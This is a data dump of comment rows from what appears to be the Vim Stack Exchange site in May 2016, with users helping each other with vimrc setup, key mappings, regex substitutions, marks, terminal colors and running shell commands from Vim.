  <row Id="12675" PostId="4721" Score="0" Text="@jpaugh because that would mean modifying my vimrc on each of the different machines, which would imply  some additional operations when pushing/pulling my dotfiles from my git repo. I agree that they are minor operations but with this method it is totally transparent." CreationDate="2016-05-07T10:15:30.677" UserId="1841" />
  <row Id="12677" PostId="4721" Score="0" Text="Wait, I think I'm missing something. I thought you wanted to have a separate `.local.vim` for each machine? You could add to the plugins list in the local file, then load them all in the main `.vimrc`. Creating the plugin list, and loading all plugins would happen in the `.vimrc`, but running the local script in between would give it the chance to modify the list of plugins." CreationDate="2016-05-07T15:12:18.097" UserId="7547" />
  <row Id="12678" PostId="7681" Score="2" Text="Strange error, for what it's worth, can you confirm that if you do `let a='grep -IRn foobar ~/.vim | grep -v backup'` and then `:cexpr system(a)` it works ?" CreationDate="2016-05-07T16:45:53.990" UserId="1821" />
  <row Id="12679" PostId="7681" Score="0" Text="@Nobe4 Yes I typed your commands, and indeed it worked as expected, the quickfix list was correctly populated without any errors." CreationDate="2016-05-07T16:49:52.867" UserId="6960" />
  <row Id="12680" PostId="7681" Score="1" Text="I suspect that for `cexpr`, the `|` is used to delimit the vim expression, and not the system one. so vim try to run `cexpr system('grep -IRn foobar ~/.vim` and then `grep -v backup')`, which of course fail." CreationDate="2016-05-07T16:53:27.490" UserId="1821" />
  <row Id="12681" PostId="7681" Score="0" Text="@Nobe4 Yes, I think you are right. It just seems the way the pipe is parsed on the command-line is inconsistent between different Ex commands, which makes learning how to use them more complex." CreationDate="2016-05-07T16:56:47.247" UserId="6960" />
  <row Id="12682" PostId="7681" Score="1" Text="I thought I found something looking at `:h :bar`, it seems that there are special cases for `|`, but unfortunately it does not match your problem..." CreationDate="2016-05-07T17:06:10.400" UserId="1821" />
  <row Id="12683" PostId="7680" Score="2" Text="Disable timeouts, while showing already typed letters to Vim's bottom-right: `set showcmd notimeout nottimeout`." CreationDate="2016-05-07T17:31:01.960" UserId="1800" />
  <row Id="12684" PostId="4721" Score="0" Text="I'm not sure I understand what you mean: in your first comment you suggested adding lines to my `vimrc` which is not what I want. Now you suggest adding lines to a `local.vimrc` which is indeed what I want and what the solution of VanLaser says. I also don't understand what you mean with the for loop (I know what a for loop is but I don't understand what you want to do with it)" CreationDate="2016-05-07T18:39:55.490" UserId="1841" />
  <row Id="12685" PostId="7683" Score="3" Text="Did you install a &quot;full&quot; python &quot;distribution&quot;? If not, do so, if yes, don't move the DLL to Vim, but make the path to python executables/dlls folder available to Vim by adding it to Windows PATH environment variable. Also check if you don't have *other* python distribution path in PATH, and remove it." CreationDate="2016-05-07T19:02:56.163" UserId="1800" />
  <row Id="12686" PostId="7683" Score="0" Text="what do you consider a 'full' python 'distribution'. I never installed python before, but ill add it to my path" CreationDate="2016-05-07T19:04:08.980" UserId="7555" />
  <row Id="12687" PostId="7683" Score="0" Text="E.g. something downloadable from here: http://www.activestate.com/activepython/downloads (just an example) (of course, restart Vim after modifying Windows' PATH)." CreationDate="2016-05-07T19:05:18.783" UserId="1800" />
  <row Id="12688" PostId="7683" Score="0" Text="I downloaded the 64bit installer from [here](https://www.python.org/downloads/release/python-279/). Adding the python directory to my path produces the same behaviour as copying the dll as far as I can tell" CreationDate="2016-05-07T19:07:14.423" UserId="7555" />
  <row Id="12689" PostId="7681" Score="0" Text="@Nobe4 Actually, your first answer helped me a lot. I had this custom command `command! -nargs=+ PQ cexpr systemlist(&lt;q-args&gt;)` which didn't work as expected when I didn't escape the pipe. Now with your answer, I changed it into `command! -nargs=+ PQ let s:shell_output=systemlist(&lt;q-args&gt;) | cgetexpr s:shell_output | unlet s:shell_output`. And to use it, I type: `:PQ grep -IRn foobar ~/.vim | grep -v backup`. No need to escape the pipe anymore, thank you very much!" CreationDate="2016-05-07T19:43:28.780" UserId="6960" />
  <row Id="12690" PostId="7681" Score="1" Text="You're welcome, considere adding this + some informations as an answer for further reference :)" CreationDate="2016-05-07T19:44:41.537" UserId="1821" />
  <row Id="12691" PostId="7684" Score="0" Text="Vim or GVim/MacVim?" CreationDate="2016-05-07T20:32:59.250" UserId="54" />
  <row Id="12692" PostId="7684" Score="0" Text="@romainl I'm using MacVim" CreationDate="2016-05-07T20:59:19.730" UserId="5991" />
  <row Id="12693" PostId="7684" Score="2" Text="Then you can't get colored output. Try `:!phpunit --colors=auto` to disable color when the terminal doesn't support it. Not &quot;pretty&quot; but a lot *cleaner*." CreationDate="2016-05-07T21:30:38.397" UserId="54" />
  <row Id="12694" PostId="7687" Score="2" Text="That's because `np` is not the name of a module itself; it is a variable defined within the program to be another name for an already existing module.  Therefore, you cannot find help on it without actually running the program." CreationDate="2016-05-08T01:28:29.910" UserId="7559" />
  <row Id="12695" PostId="7687" Score="0" Text="@zondo I understand. If there's a way like vim help command, let me able to do :help(numpy.array). Or do you have some suggestions?" CreationDate="2016-05-08T02:39:42.710" UserId="7558" />
  <row Id="12696" PostId="7687" Score="2" Text="You could use `:!pydoc numpy.array`" CreationDate="2016-05-08T02:41:41.020" UserId="7559" />
  <row Id="12697" PostId="7687" Score="0" Text="@zondo, thanks! I don't need to google usage every time." CreationDate="2016-05-08T02:48:51.143" UserId="7558" />
  <row Id="12698" PostId="7687" Score="1" Text="It's a pleasure!  For more information, try `:help :!` from within Vim.  You might also find `man pydoc` from the terminal to be interesting." CreationDate="2016-05-08T02:51:43.243" UserId="7559" />
  <row Id="12700" PostId="7686" Score="0" Text="This is just an example. What I wanted to do is, &quot;paste blockwise&quot;. My text has multiple lines, whenever I paste it, all lines of my text should be pasted in the cursor's position in all lines. Please modify your answer ." CreationDate="2016-05-08T04:43:40.413" UserId="7161" />
  <row Id="12701" PostId="7690" Score="0" Text="That's pretty cool." CreationDate="2016-05-08T05:02:58.377" UserId="7558" />
  <row Id="12702" PostId="4721" Score="0" Text="Yes. If you set up an (empty) list of plugins to load in your `.vimrc` file, the call the machine-local script, then that script can add whatever it want to that list. Each local script could add something different, and the `.vimrc` would treat it the same way in each case. Finally, the main `.vimrc` would load the plugins mentioned in the list. Does that make sense?" CreationDate="2016-05-08T05:05:35.260" UserId="7547" />
  <row Id="12703" PostId="4721" Score="0" Text="I haven't tried it, but it seems like the most robust, and simplest solution. It is more general than VanLaser's solution, because it allows the main `.vimrc` more flexibility in how it choses to load the plugins, making it usable with other plugin managers, e.g. `vim-addon-manager`, which is what I had in mind. However, if VanLaser's solution works for your plugin manager, then go with it. :-)" CreationDate="2016-05-08T05:13:34.680" UserId="7547" />
  <row Id="12704" PostId="7686" Score="2" Text="I think my answer is perfectly fine with your given question.  If you want to paste blockwise text next to each other, the answer is simply: `$p` (which is what the script is basically doing).  But, the effort you put into your question and your statement of how you are already familiar with visual blocks lead me to believe it wasn't that simple." CreationDate="2016-05-08T05:21:28.627" UserId="5229" />
  <row Id="12705" PostId="7580" Score="0" Text="sorry for delay in making this as accepted answer, now accepted as answer" CreationDate="2016-05-08T05:41:05.043" UserId="7457" />
  <row Id="12706" PostId="7684" Score="0" Text="@romainl I used `:!phpunit --colors=never`. Is this a MacVim thing?" CreationDate="2016-05-08T08:44:53.817" UserId="5991" />
  <row Id="12707" PostId="7684" Score="1" Text="Both MacVim and GVim come with a &quot;dumb&quot; terminal emulator that doesn't understand color. If you do `:!command` in Vim in a real terminal emulator, Vim is suspended and `command` is executed in the host shell which (hopefully) understands color escape sequences." CreationDate="2016-05-08T09:29:16.690" UserId="54" />
  <row Id="12708" PostId="7593" Score="0" Text="@SibiCoder I don't know if this is what you want, but you could try this: http://vpaste.net/CmvOX Hit `\y` in visual mode to copy a rectangular box, then `\p` in normal mode to paste it by replacing a box of text with similar dimensions." CreationDate="2016-05-08T13:03:24.380" UserId="6960" />
  <row Id="12709" PostId="7684" Score="0" Text="@romainl you should add that as an answer as that effectively explains my pain." CreationDate="2016-05-08T16:18:49.140" UserId="5991" />
  <row Id="12710" PostId="7691" Score="1" Text="To make something community wiki, [edit] the post and click the checkbox on the right (between the markdown and the preview)." CreationDate="2016-05-08T16:55:11.653" UserId="7559" />
  <row Id="12711" PostId="7691" Score="5" Text="The vim_dev mailing list is the appropriate place for that kind of discussion." CreationDate="2016-05-08T21:07:46.973" UserId="54" />
  <row Id="12712" PostId="7661" Score="0" Text="I don't think this is worth to be posted as an answer since it was just an issue with trailing spaces in my `.vimrc` file. However, another user had the same issue, hence I'll leave the [link](https://github.com/jalvesaq/Nvim-R/issues/61#issuecomment-217409723) to the issue discussion on Github." CreationDate="2016-05-09T06:23:32.270" UserId="7533" />
  <row Id="12713" PostId="7694" Score="1" Text="How do you jump to that mark?" CreationDate="2016-05-09T07:33:58.713" UserId="54" />
  <row Id="12714" PostId="7694" Score="0" Text="@romainl With 'a or `a ... both not working." CreationDate="2016-05-09T07:46:37.933" UserId="911" />
  <row Id="12715" PostId="7694" Score="0" Text="Isn't it simply a plugin or a config which remaps `'a`? You can check with `:nmap`." CreationDate="2016-05-09T08:04:29.073" UserId="1841" />
  <row Id="12716" PostId="7694" Score="4" Text="Also, does `:normal! 'a` work?" CreationDate="2016-05-09T08:09:33.100" UserId="54" />
  <row Id="12717" PostId="7272" Score="0" Text="You've used control-d (to get the list of colorschemes) where I've always used tab.  Is there a difference?  (:h for control-d just witters on pointlessly about scrolling downwards)." CreationDate="2016-05-09T08:21:05.070" UserId="859" />
  <row Id="12718" PostId="7694" Score="0" Text="Yes, `:normal! 'a` works ... hmhm? Why not `'a`? I don't understand it." CreationDate="2016-05-09T10:33:54.570" UserId="911" />
  <row Id="12719" PostId="7694" Score="6" Text="Does it still work when you remove the bang `:normal 'a`? If not, then maybe a mapping is interfering as @statox said (look at `:verb nmap 'a`). Otherwise, maybe something is intercepting the keystrokes `'a` before Vim (your terminal emulator, your window manager, ...). See in their configuration if `'a` is not already bound to some function." CreationDate="2016-05-09T10:47:26.923" UserId="6960" />
  <row Id="12720" PostId="7693" Score="0" Text="c++ syntax is too complicated for vim to recognize, you should look for some plugin to help you indent your code, like the clang_complete and Youcomplete me." CreationDate="2016-05-09T11:27:34.513" UserId="2760" />
  <row Id="12721" PostId="7269" Score="0" Text="S-C-k also works for me in nnoremap mode." CreationDate="2016-05-09T11:58:30.447" UserId="7161" />
  <row Id="12722" PostId="7691" Score="0" Text="I don't have the checkbox...is this edit only available to users above certain rep?" CreationDate="2016-05-09T12:51:45.007" UserId="4985" />
  <row Id="12723" PostId="7691" Score="0" Text="According to [this](http://meta.stackexchange.com/questions/11740/what-are-community-wiki-posts) I cannot, as the asker of the question, do that conversion." CreationDate="2016-05-09T13:33:10.193" UserId="4985" />
  <row Id="12724" PostId="7672" Score="0" Text="Sorry for the delay. I am using Vim. The whitespace are spaces, not tabs. Your answer was correct. Thanks for your help." CreationDate="2016-05-09T13:56:03.627" UserId="7298" />
  <row Id="12725" PostId="7582" Score="0" Text="You can try '0 to '9. That jumps to the last edited position in the previously edited files." CreationDate="2016-05-09T14:16:48.253" UserId="7161" />
  <row Id="12726" PostId="7695" Score="1" Text="AFAIK any Vim instance *is* already its own server, and its instance name can be found by reading the `v:servername` variable. See also `:h clientserver` (the &quot;SERVER NAME&quot; section)." CreationDate="2016-05-09T14:48:57.457" UserId="1800" />
  <row Id="12727" PostId="7699" Score="1" Text="When your cursor reach the last line of the file, if you hit `zz` it will redraw the screen and position the current line at the center of the window which should display a few `~` lines after EOF." CreationDate="2016-05-09T16:49:53.133" UserId="6960" />
  <row Id="12728" PostId="7699" Score="0" Text="yes, but if you move the cursor again positioning it at the bottom again." CreationDate="2016-05-09T18:00:13.533" UserId="7571" />
  <row Id="12729" PostId="7699" Score="2" Text="It sounds like you have the `scrolloff` option set. Try `:set scrolloff=0` and that behavior should change." CreationDate="2016-05-09T18:02:09.767" UserId="6489" />
  <row Id="12730" PostId="7701" Score="2" Text="Enter a line containing a simple dot `.` or hit `C-c`." CreationDate="2016-05-09T18:20:55.377" UserId="6960" />
  <row Id="12731" PostId="7701" Score="1" Text="Have you tried `ctrl-c`? Edit: user9444929 was a second faster :-)" CreationDate="2016-05-09T18:20:57.450" UserId="1841" />
  <row Id="12732" PostId="7698" Score="1" Text="Are you using vim within in a terminal window, or a GUI version of vim?" CreationDate="2016-05-09T19:16:49.847" UserId="7546" />
  <row Id="12733" PostId="7700" Score="0" Text="Unfortunately, setting `scrolloff` to 10 will still not show lines AFTER EOF like OP wanted." CreationDate="2016-05-09T19:17:17.363" UserId="6489" />
  <row Id="12734" PostId="7698" Score="2" Text="That colorscheme [is designed to bail out if you don't use a GUI Vim or if Vim thinks your terminal emulator doesn't support 256 colors](https://github.com/nielsmadan/harlequin/blob/master/colors/harlequin.vim#L14-L16)." CreationDate="2016-05-09T19:20:03.910" UserId="54" />
  <row Id="12735" PostId="7272" Score="0" Text="There's a difference.  :-)   I have expanded the answer." CreationDate="2016-05-09T20:03:43.957" UserId="6590" />
  <row Id="12736" PostId="7700" Score="0" Text="Indeed, that's why I suggested using `CTRL-E` and ̀`scrolloff` was just &quot;additional&quot;. Now it is a partial solution, OP is free not to accept it since it doesn't completely answer the question." CreationDate="2016-05-09T20:03:58.193" UserId="1841" />
  <row Id="12737" PostId="7698" Score="0" Text="I am using terminal window vim. Perhaps I should use a different terminal emulator then" CreationDate="2016-05-09T20:42:26.220" UserId="7399" />
  <row Id="12738" PostId="7706" Score="0" Text="It works for me." CreationDate="2016-05-10T06:00:06.840" UserId="21" />
  <row Id="12739" PostId="7706" Score="2" Text="Why go through all that trouble when you already have `[p` and `]p`?" CreationDate="2016-05-10T06:14:24.127" UserId="54" />
  <row Id="12740" PostId="7705" Score="2" Text="`[]` is an empty collection. Why do you have that in your pattern?" CreationDate="2016-05-10T06:21:08.603" UserId="54" />
  <row Id="12741" PostId="7707" Score="3" Text="Why not `gt` and `gT`?" CreationDate="2016-05-10T07:33:59.453" UserId="54" />
  <row Id="12742" PostId="7707" Score="1" Text="Thanks. It works. :) Can you tell me what causes my mapping not to work?" CreationDate="2016-05-10T07:39:39.607" UserId="7161" />
  <row Id="12743" PostId="7707" Score="2" Text="@SibiCoder Maybe because Vim didn't set up the modified arrow keys. In your `vimrc`, you could try adding this line `exe &quot;set &lt;xRight&gt;=\e[1;*C&quot; | exe &quot;set &lt;xLeft&gt;=\e[1;*D&quot;`. If this doesn't work, could you post what is displayed in a Vim buffer when you insert a literal `&lt;C-Left&gt;` (`&lt;C-V&gt;` then `&lt;C-Left&gt;` in insert mode)? Or maybe `&lt;C-Left&gt;` is already bound to some function in your terminal emulator, so Vim never receives this keystroke." CreationDate="2016-05-10T07:44:11.787" UserId="6960" />
  <row Id="12744" PostId="7707" Score="1" Text="I can say that it works for me. Maybe (just maybe) you've remapped arrows or something. You can try show us your vimrc." CreationDate="2016-05-10T07:44:17.040" UserId="6634" />
  <row Id="12745" PostId="7707" Score="1" Text="I started with vim -u NONE . and mapped in command line, it doesn't work" CreationDate="2016-05-10T07:53:31.447" UserId="7161" />
  <row Id="12746" PostId="7706" Score="3" Text="The first comment also works fine for me. Does `:nmap p` shows the correct mapping? If it doesn't you can use `:verbose nmap p` to see which file overrided your mapping." CreationDate="2016-05-10T07:57:01.363" UserId="1841" />
  <row Id="12747" PostId="7707" Score="3" Text="Try with `$ vim -Nu NONE`." CreationDate="2016-05-10T09:25:04.857" UserId="54" />
  <row Id="12748" PostId="7709" Score="4" Text="I think `\w` matches only one character of a word, what if you use `\w+` to match several word characters? (I can't test it right now unfortunately)" CreationDate="2016-05-10T10:07:26.560" UserId="1841" />
  <row Id="12749" PostId="7707" Score="1" Text="Receiving E388: Couldn't find definition.    It doesn't work. My versions is 7.2" CreationDate="2016-05-10T10:10:36.640" UserId="7161" />
  <row Id="12750" PostId="7709" Score="0" Text="Using `syn match VarName '\w'` or `\w\+` give the same result (I think you meant `\w\+` but correct me if I'm wrong), it basically highlights all the words (except the keywords previously defined)." CreationDate="2016-05-10T10:21:20.997" UserId="7128" />
  <row Id="12751" PostId="7710" Score="1" Text="do you know if there is any way to include the matched keywords inside the regex? Instead of building it by hand" CreationDate="2016-05-10T11:24:20.913" UserId="1821" />
  <row Id="12753" PostId="7714" Score="1" Text="Thanks. Previously I tried just `:history` which was bit closer." CreationDate="2016-05-10T11:53:39.407" UserId="7501" />
  <row Id="12754" PostId="7714" Score="3" Text="As for replace, one can look at `q:`. It's not exclusive to replaces, but it's a real buffer, so all of vim's power works there." CreationDate="2016-05-10T11:54:04.683" UserId="1296" />
  <row Id="12755" PostId="7714" Score="1" Text="@PhilippFrank, I'll add this to the answer, thanks" CreationDate="2016-05-10T11:54:58.243" UserId="1821" />
  <row Id="12756" PostId="7710" Score="1" Text="If you have time, could you explain the `'\v&lt;(real([123]D)?|int)\s+\i+&gt;'` ? It seems very useful and powerful, but a little too involved for me to understand it..." CreationDate="2016-05-10T12:15:08.550" UserId="7128" />
  <row Id="12757" PostId="7706" Score="3" Text="@statox Thanks, I had an another mapping for p already, that was what was conflicting with this mapping." CreationDate="2016-05-10T12:17:05.413" UserId="7479" />
  <row Id="12758" PostId="7717" Score="3" Text="`$-1` could be used to express the second to last line. Does `:5,$-1s/^/X` work for you?" CreationDate="2016-05-10T12:35:58.113" UserId="6960" />
  <row Id="12759" PostId="7717" Score="0" Text="@user9433424 Yes, that seems to be working." CreationDate="2016-05-10T12:38:31.540" UserId="2774" />
  <row Id="12760" PostId="7695" Score="1" Text="I just tried this and it works for `gvim` but not for terminal-bound `vim`, which is my use case. (Although client-server still works with these). However, your answer suggests that no, there is no counter-indication to *always* having a server on." CreationDate="2016-05-10T13:13:12.560" UserId="1940" />
  <row Id="12764" PostId="7718" Score="2" Text="`-1` in a range can be shorted to `-` as the `1` can be assumed. e.g. `:5,$-s/^/X`" CreationDate="2016-05-10T14:12:32.247" UserId="778" />
  <row Id="12765" PostId="7714" Score="4" Text="Related [Vimcasts](http://vimcasts.org/) episode: [Refining search patterns with the command-line window](http://vimcasts.org/episodes/refining-search-patterns-with-the-command-line-window/)" CreationDate="2016-05-10T14:14:26.333" UserId="778" />
  <row Id="12767" PostId="7705" Score="0" Text="I apologize I copied the commented out version of my regex, the actual one has `[\r\n\s]` in the collection." CreationDate="2016-05-10T14:58:17.423" UserId="7578" />
  <row Id="12768" PostId="6483" Score="0" Text="@Lawrence: According to your last comment it seems that you found a solution. For my curiosity and for the other users who might be looking up your question it would be nice if you made an answer with your solution :-)" CreationDate="2016-05-10T15:20:32.910" UserId="1841" />
  <row Id="12769" PostId="7705" Score="1" Text="Then the error message should be sufficient: you need to escape the backslashes. Try `[\\r\\n\\s]`." CreationDate="2016-05-10T15:44:10.787" UserId="54" />
  <row Id="12770" PostId="7705" Score="0" Text="Same error message as before, tho now the parsed regex looks as so: `/v(.)@&lt;=w+\r\n\s]/` Shouldn't there be a `[` after `w+`?" CreationDate="2016-05-10T15:48:26.157" UserId="7578" />
  <row Id="12772" PostId="7699" Score="0" Text="Indeed the behavior has been corrected! thank you" CreationDate="2016-05-10T16:21:59.020" UserId="7571" />
  <row Id="12773" PostId="7727" Score="0" Text="I use undotree, but I've used Gundo in the past, and I don't remember it having this feature (that is, the linewise history)." CreationDate="2016-05-10T16:34:58.680" UserId="1821" />
  <row Id="12774" PostId="7728" Score="0" Text="I use it, and I've used Gundo in the past, and I don't remember any of them having this feature (that is, the linewise history)." CreationDate="2016-05-10T16:35:14.477" UserId="1821" />
  <row Id="12775" PostId="7728" Score="2" Text="No, neither undotree nor gundo has linewise history. I've looked in the past for a plugin to do this without results. The benifit is you can much more easily perform your current workflow...same workflow I use." CreationDate="2016-05-10T16:36:53.810" UserId="895" />
  <row Id="12776" PostId="7694" Score="0" Text="@user9433424 It works without bang too. You're right, there must be a problem with osx terminal.app. I switched to iTerm2, now it works fine. Thanks for your help!" CreationDate="2016-05-10T16:42:55.490" UserId="911" />
  <row Id="12777" PostId="6483" Score="0" Text="@statox, I did something that I don't quite understand and probably isn't a very good solution, so I won't post it as an answer, but: `vnoremap it &lt;esc&gt;:set nohls&lt;cr&gt;&quot;q?^$\\|%&lt;cr&gt;jV&quot;q/^$\\|%&lt;cr&gt;k&#xA;omap it &lt;c-u&gt;&lt;c-v&gt;:normal! Vit&lt;cr&gt;`" CreationDate="2016-05-10T17:06:05.640" UserId="4505" />
  <row Id="12778" PostId="6483" Score="0" Text="@statox, one problem is that this contaminates the search register." CreationDate="2016-05-10T17:20:18.183" UserId="4505" />
  <row Id="12779" PostId="7700" Score="1" Text="Although it is just a partial solution i think `CTRL-E` is what i was looking for. I'd love if there was a way to display the lines after EOF automatically though." CreationDate="2016-05-10T17:29:52.780" UserId="7571" />
  <row Id="12780" PostId="7700" Score="0" Text="@Miguel I'm glad it fits your needs. I think it could be possible to create a mapping which would call `&lt;C-e&gt;` when you scroll down but I'm really not sure it would work correctly... I'll try and see what is possible to do but I'm not sure I'll be able to create something convenient." CreationDate="2016-05-10T17:36:53.550" UserId="1841" />
  <row Id="12781" PostId="6240" Score="0" Text="my fork has been updated and refactored, it's on par with upstream master. What's not maintained is that branch specifically, I've abandoned that solution in favor of what's on fork's master now." CreationDate="2016-05-10T17:41:12.093" UserId="6324" />
  <row Id="12782" PostId="7729" Score="2" Text="I don't think so. I'm pretty sure that Vim can't tell between left and right alt, and even if it could I don't think you can map things just to alt. You need it to be alt + another key." CreationDate="2016-05-10T18:20:08.030" UserId="6489" />
  <row Id="12783" PostId="7729" Score="1" Text="I second @Tumbler41: vim can't make a difference between right and left alt keys and I think I've seen other question about mapping something to alt only and if I remember well the answer were to make the terminal do that." CreationDate="2016-05-10T18:30:40.567" UserId="1841" />
  <row Id="12784" PostId="6483" Score="0" Text="@Lawrence indeed that seems to be a pretty messy solution you were right not to post it as an answer :-)" CreationDate="2016-05-10T18:33:13.223" UserId="1841" />
  <row Id="12785" PostId="7699" Score="0" Text="You can read your answer here: http://stackoverflow.com/questions/7406814/in-vim-how-do-you-scroll-a-buffer-so-the-cursor-location-is-centered-in-the-scr There are more answers to this, basically it is not possible, only with workarounds." CreationDate="2016-05-09T19:29:26.767" UserId="7267" />
  <row Id="12788" PostId="7695" Score="0" Text="So all is good :)" CreationDate="2016-05-10T21:57:04.770" UserId="1800" />
  <row Id="12789" PostId="7729" Score="0" Text="It's not vim-specific but you can have a look at https://pqrs.org/osx/karabiner/seil.html.en, it's useful for remapping specific keys. e.g. remapping caps lock with `&lt;esc&gt;` or `&lt;ctrl&gt;`" CreationDate="2016-05-10T22:05:43.027" UserId="1821" />
  <row Id="12790" PostId="7726" Score="0" Text="For the 1st step, you can use `:changes` - the most recent value on the 2nd column that matches the line number you want to redo has a change number (1st column) associated with it, that can be used as a count to `g;` (add one to that count number)." CreationDate="2016-05-10T22:10:58.137" UserId="1800" />
  <row Id="12791" PostId="7730" Score="1" Text="I don't know why the autocommand doesn't trigger when you open the file from a JAR but a workaround could be to put in your vimrc a function which will execute your list of commands, bind a key to call the function and use it to manually decompile the file." CreationDate="2016-05-11T07:25:55.280" UserId="1841" />
  <row Id="12792" PostId="7733" Score="0" Text="Thanks a lot. Tricky regex. Do you if it's possible to indent each line ? No need for extra spaces in `\r  \` then." CreationDate="2016-05-11T10:46:32.720" UserId="3357" />
  <row Id="12793" PostId="7733" Score="0" Text="Sorry, I'm not sure to understand, do you mean the substitution command should indent the lines beginning with a dot? It depends on how you indent your code, but if you use a tab you could use the same command and just replace the 2 spaces with a tab `\t` like this: `:s/\v(\(\w{-})@&lt;!\./\r\t\./g`" CreationDate="2016-05-11T10:50:39.427" UserId="6960" />
  <row Id="12794" PostId="7733" Score="0" Text="I'm using `==` to indent. A gist with a proper code. https://gist.github.com/anonymous/7735cf710289815c85ec719abad8c403 I've try few things for here without success http://stackoverflow.com/questions/2732618/auto-indent-in-vim-string-replacement-new-line" CreationDate="2016-05-11T11:03:35.390" UserId="3357" />
  <row Id="12795" PostId="7733" Score="0" Text="Thanks for the update with multiple dot inside." CreationDate="2016-05-11T11:06:17.403" UserId="3357" />
  <row Id="12796" PostId="7733" Score="0" Text="Thank you for the gist, I understand now, I'm going to look for a solution and update the answer if I find something." CreationDate="2016-05-11T11:12:56.270" UserId="6960" />
  <row Id="12797" PostId="7735" Score="0" Text="Amazing that's exactly what I needed. Thanks!" CreationDate="2016-05-11T11:51:23.803" UserId="1841" />
  <row Id="12798" PostId="7733" Score="0" Text="just ouhao. Thanks a lot it's perfect !" CreationDate="2016-05-11T12:06:57.663" UserId="3357" />
  <row Id="12799" PostId="7710" Score="0" Text="Thank you very much. I have a *lot* to learn." CreationDate="2016-05-11T12:10:31.610" UserId="7128" />
  <row Id="12802" PostId="7730" Score="3" Text="How are you looking within the JAR? 7-zip or something? I'm not sure but I'm guessing that the fact that the file is compressed is messing with vim." CreationDate="2016-05-11T13:23:55.590" UserId="6489" />
  <row Id="12803" PostId="7729" Score="0" Text="Yep thats what I am using and it does the job." CreationDate="2016-05-11T15:08:37.057" UserId="7053" />
  <row Id="12804" PostId="7417" Score="0" Text="Please expand your answer. Will this function be automatically called when I type a word?" CreationDate="2016-05-11T15:27:50.420" UserId="7161" />
  <row Id="12805" PostId="7707" Score="0" Text="Do I need to delete the question since it appears to be a issue/bug related one? Are issue related questions allowed here?" CreationDate="2016-05-11T15:29:10.310" UserId="7161" />
  <row Id="12806" PostId="7417" Score="0" Text="No, this function will create abbreviations. cf the `execute 'iabbrev ...'`" CreationDate="2016-05-11T15:31:12.097" UserId="1821" />
  <row Id="12807" PostId="7741" Score="2" Text="I don't know how to do it in a single substitution, but you could do it in 2 while in visual mode (after selecting the python expression): `:'&lt;,'&gt;s/\v(.*)\n/'\1', / | s/\v(.*), /[\1]/` You could transform this into a visual mapping: `xnoremap ,x :s/\v(.*)\n/'\1', / &lt;Bar&gt; s/\v(.*), /[\1]/&lt;CR&gt;` and maybe into a normal mapping if the expression is inside a paragraph: `nnoremap ,x :'{+1,'}-1s/\v(.*)\n/'\1', / &lt;Bar&gt; s/\v(.*), /[\1]/&lt;CR&gt;` Here the mapping would be `,x`." CreationDate="2016-05-11T16:36:16.653" UserId="6960" />
  <row Id="12808" PostId="7749" Score="5" Text="Your question may be answered here: http://stackoverflow.com/questions/2683521/vim-search-in-c-c-code-lines" CreationDate="2016-05-11T21:56:53.917" UserId="895" />
  <row Id="12809" PostId="7749" Score="2" Text="Also see my post on SO: http://stackoverflow.com/a/35323962/2072269. It's limited to excluding comments which can be folded, though." CreationDate="2016-05-11T23:37:18.563" UserId="205" />
  <row Id="12810" PostId="7733" Score="0" Text="The last version is faster but their is a problem with indent. All the block is not properly indent. Also I've try to map to a leader key `map &lt;Leader&gt;a :s/^  // | s/\v\ze%(\(\w+%(\.\w+)*)@&lt;!\./\=&quot;\n  &quot; .  matchstr(getline('.'), '^\s*')/g&lt;CR&gt;` but I get trailing characters errors. :/" CreationDate="2016-05-12T07:42:21.250" UserId="3357" />
  <row Id="12811" PostId="7733" Score="0" Text="@BeniMio For the trailing characters errors, if you escape the pipe `\|` or if you replace it with `&lt;bar&gt;`, it should fix them. For the indentation problem, could you link a gist with a before / after the substitution?" CreationDate="2016-05-12T07:49:47.097" UserId="6960" />
  <row Id="12813" PostId="7733" Score="0" Text="@BeniMio For the indentation problem, I think in the first substitution, a space is missing, it should be `^` then 2 spaces. But in your code, it's `^` then only one space. Maybe you could try this: http://vpaste.net/dAhc7" CreationDate="2016-05-12T07:57:42.077" UserId="6960" />
  <row Id="12816" PostId="7753" Score="1" Text="Thanks, that's it ;)" CreationDate="2016-05-12T09:18:45.990" UserId="7599" />
  <row Id="12817" PostId="7745" Score="1" Text="On certain keyboards } is not created by using Shift at all. (E.g. [norwegian keyboards where alt gr + 0 is used](https://www.google.co.uk/search?q=norwegian+keyboard+setup&amp;safe=active&amp;espv=2&amp;biw=1515&amp;bih=758&amp;source=lnms&amp;tbm=isch&amp;sa=X&amp;ved=0ahUKEwjc5abnmtTMAhUEKywKHUqpBXoQ_AUIBigB&amp;dpr=0.9#imgrc=qGfs-s1ImjkS7M%3A)). In such a scenario the commands are not identical." CreationDate="2016-05-12T09:22:43.243" UserId="7601" />
  <row Id="12818" PostId="7754" Score="2" Text="That doesn't totally follow the workflow you described but [vim-oblique](https://github.com/junegunn/vim-oblique) improves the `*` search. Especially it makes `*` visually select the current word without moving your cursor. Once it is installed you could do `*ciw` to put the old word in the search register and change the word. Then you can use `n` and `.`." CreationDate="2016-05-12T09:32:17.907" UserId="1841" />
  <row Id="12819" PostId="7754" Score="0" Text="Pressing n will move you to the next occurrence of last searched pattern. Why didn't you try that?" CreationDate="2016-05-12T10:28:50.977" UserId="7161" />
  <row Id="12820" PostId="7754" Score="0" Text="...because I didn't search to get to the first occurrence, so `n` won't work." CreationDate="2016-05-12T11:53:58.500" UserId="5339" />
  <row Id="12824" PostId="7762" Score="0" Text="Thanks for this solution (it is the one I will use), but is there any other way around, using my &quot;col_number&quot; variable ? That would allow me to understand better how execute/normal work." CreationDate="2016-05-12T15:29:45.233" UserId="7128" />
  <row Id="12825" PostId="7762" Score="1" Text="@Feffe: My update should clarify this :-)" CreationDate="2016-05-12T15:36:27.800" UserId="1841" />
  <row Id="12826" PostId="6366" Score="0" Text="I think either CR or LF can be seen at a time, not both." CreationDate="2016-05-12T15:55:38.070" UserId="7161" />
  <row Id="12828" PostId="7763" Score="0" Text="fantastic and comprehensive answer. you Rock" CreationDate="2016-05-12T17:52:45.553" UserId="7597" />
  <row Id="12829" PostId="7768" Score="0" Text="That makes sense...like sed, I'll try it now." CreationDate="2016-05-12T18:17:12.780" UserId="7607" />
  <row Id="12830" PostId="7768" Score="0" Text="Having an issue with the match...I'll need to step away for a bit but will come back to this." CreationDate="2016-05-12T18:35:14.487" UserId="7607" />
